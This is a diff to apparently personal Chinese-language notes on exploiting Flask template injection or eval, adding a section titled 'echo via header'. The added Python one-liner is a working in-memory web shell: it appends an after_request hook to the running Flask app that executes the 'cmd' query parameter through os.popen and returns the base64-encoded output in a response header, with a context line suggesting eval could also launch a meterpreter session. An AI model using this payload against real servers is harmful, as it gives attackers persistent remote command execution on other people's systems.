@@ -52,6 +52,27 @@
 	- 使用方式
 		- 想办法把payload丢给eval执行即可，对SSTI来说应该很简单
 		- 然后访问路由：`/c4tchm3?cmd=whoami`
+- # 通过header进行回显
+	- ```python
+	  [
+	      app.view_functions
+	      for app in [ __import__('sys').modules["__main__"].app ]
+	      for c4tchm3 in [
+	          lambda resp: [
+	              resp
+	              for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
+	              if [
+	                  resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
+	                  print(resp.headers["Aaa"])
+	              ]
+	          ][0]
+	      ]
+	      if [
+	          app.__dict__.update({'_got_first_request':False}),
+	          app.after_request_funcs.setdefault(None, []).append(c4tchm3)
+	      ]
+	  ]
+	  ```
 - # 其他思路？
 	- 其实如果可以eval的话，也可以直接用eval上线meterpreter的
 	- 但是这就要出网了
